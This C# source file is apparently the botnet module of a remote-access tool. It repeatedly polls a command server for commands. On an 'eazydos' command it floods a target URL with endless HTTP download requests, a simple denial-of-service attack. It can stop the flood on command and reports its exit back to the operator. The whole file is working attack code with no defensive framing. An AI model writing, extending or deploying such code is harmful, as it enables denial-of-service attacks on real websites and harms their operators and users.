using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;

namespace s1l14lx3
{
    public static class BNM
    {
        private static string URL = "";
        private static bool RunMain = true;
        private static Thread MDThread;
        private static bool EazyDoSRoop = true;
        public static void Start()
        {
            //close thread
            S1l14lx3.RunMain = false;
            S1l14lx3.RunSub = false;

            Thread th1 = new Thread(MAINTHREAD);
            th1.Start();
            th1.Join();
        }
        private static async void MAINTHREAD()
        {
            string BeforeCMD = "";
            while (RunMain)
            {
                string GetCommand = S1l14lx3_Module.GET("/cmd/ALL");
                if (GetCommand == "Error")
                {
                    continue;
                }
                string[] Command = { };
                ALLRemoteCommand data = JsonConvert.DeserializeObject<ALLRemoteCommand>(GetCommand);
                if (data == null)
                {
                    continue;
                }
                else
                {
                    Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
                }
                if (GetCommand == BeforeCMD)
                {
                    continue;
                }
                else if (GetCommand == "")
                {
                    continue;
                }
                if (data.Roop == false)
                {
                    BeforeCMD = GetCommand;
                }
                Console.WriteLine(Command[0]);
                switch (Command[0])
                {
                    //Eazy DoS
                    case "eazydos":
                        URL = Command[1];
                        MDThread = new Thread(While_Get_Dos);
                        MDThread.Start();
                        break;
                    //Eazy DoS stop
                    case "eazydoss":
                        EazyDoSRoop = false;
                        break;
                    //Exit
                    case "bnexit":
                        await S1l14lx3_Module.DATA_POST($"BotNetを終了しました");
                        S1l14lx3.MainThread.Start();
                        S1l14lx3.RunMain = true;
                        S1l14lx3.RunSub = true;
                        RunMain = false;
                        EazyDoSRoop = false;
                        break;
                    //Default
                    default:
                        continue;
                }
                await Task.Delay(10);
            }
        }
        private static void While_Get_Dos()
        {
            while (EazyDoSRoop)
            {
                try
                {
                    WebClient web = new WebClient();
                    web.DownloadData(URL);
                }
                catch (Exception ex)
                {
                    //none
                }
            }
        }
    }
}
